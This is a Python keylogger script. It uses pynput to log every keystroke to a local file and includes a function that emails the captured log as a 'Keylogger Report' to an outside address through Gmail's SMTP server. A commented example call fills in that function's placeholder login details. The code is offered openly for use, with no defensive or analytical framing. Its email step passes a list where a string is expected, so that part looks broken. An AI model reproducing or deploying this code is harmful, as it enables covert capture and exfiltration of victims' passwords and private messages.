from pynput import keyboard
import smtplib
from email.message import EmailMessage

def send_email(log_file, sender_email, sender_pass, recipient_email):
    msg = EmailMessage()
    msg['Subject'] = "Keylogger Report"
    msg['From'] = sender_email
    msg['To'] = recipient_email
    
    with open(log_file, "r") as f:
        msg.set_content(f.readlines())  # Attach the content
    
    # Connect to SMTP server (for Gmail example)
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_pass)
        server.send_message(msg)

# Example usage (after logging is finished or at intervals):
# send_email("key_log.txt", "<your.email>@gmail.com", "<your.email.password>", "<your.email>@gmail.com")

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            else:
                f.write(f"[{key.name}]")

def main():
    print("Keylogger started. Press Ctrl + C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
